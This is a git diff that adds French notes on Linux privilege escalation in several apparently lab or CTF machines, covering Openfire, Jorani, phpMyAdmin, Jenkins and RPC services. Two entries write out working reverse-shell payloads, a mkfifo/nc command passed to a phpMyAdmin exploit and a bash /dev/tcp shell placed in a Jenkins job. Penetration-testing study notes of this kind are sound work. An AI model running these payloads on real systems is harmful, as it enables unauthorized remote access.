@@ -148,3 +148,38 @@ ls -la /shareds
 # S'attacher à la session
 tmux -S /shareds
 ```
+## Techniques d'élévation de privilèges Linux dans des Box
+### Exploitation de services web vulnérables
+Exemple (Fired):
+```bash
+# Exploiter Openfire via un plugin malveillant
+# Télécharger et installer un plugin webshell
+# Exécuter des commandes via l'interface web
+```
+Exemple (Jordak):
+```bash
+# Exploiter Jorani v1 via CVE-2023-26469
+# Utiliser un script d'exploitation pour obtenir RCE
+```
+### Exploitation de bases de données
+Exemple (Shiftdel):
+```bash
+# Exploiter phpMyAdmin via CVE-2018-12613
+python2 50457.py 192.168.57.174 8888 / wordpress ThinnerATheWaistline348 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.57 1234 >/tmp/f'
+```
+### Exploitation de Jenkins
+Exemple (vmdak):
+```bash
+# Rediriger le port Jenkins local via SSH
+ssh -L 9999:127.0.0.1:8080 vmdak@192.168.212.103
+
+# Créer une tâche Jenkins avec un reverse shell
+# Dans "Execute shell":
+bash -c 'bash -i >& /dev/tcp/192.168.49.x/4444 0>&1'
+```
+### Exploitation de services RPC
+Exemple (PC):
+```bash
+# Exploiter un service RPC vulnérable
+python3 50983.py
+```
